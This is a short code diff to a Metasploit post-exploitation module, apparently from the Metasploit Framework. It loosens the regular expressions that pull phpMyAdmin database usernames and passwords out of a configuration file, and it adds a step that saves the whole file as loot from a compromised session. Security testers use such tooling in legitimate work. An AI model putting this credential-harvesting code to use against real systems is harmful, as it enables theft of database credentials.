@@ -26,8 +26,8 @@ class MetasploitModule < Msf::Post
    end
 
   def parse_creds(contents)
-    db_user = /\$dbuser=\'(.*)\';/.match(contents)
-    db_pass = /\$dbpass=\'(.*)\';/.match(contents)
+    db_user = /\$dbuser=['"](.*)['"];/.match(contents)
+    db_pass = /\$dbpass=['"](.*)['"];/.match(contents)
 
     unless db_user && db_pass
       print_error("Couldn't find PhpMyAdmin credentials")
@@ -66,5 +66,8 @@ class MetasploitModule < Msf::Post
 
     print_good("Extracting creds")
     parse_creds(res)
+
+    p = store_loot('phpmyadmin_conf', 'text/plain', session, res, 'phpmyadmin_conf.txt', 'phpmyadmin_conf')
+    print_good("Config file located at #{p}")
   end
 end
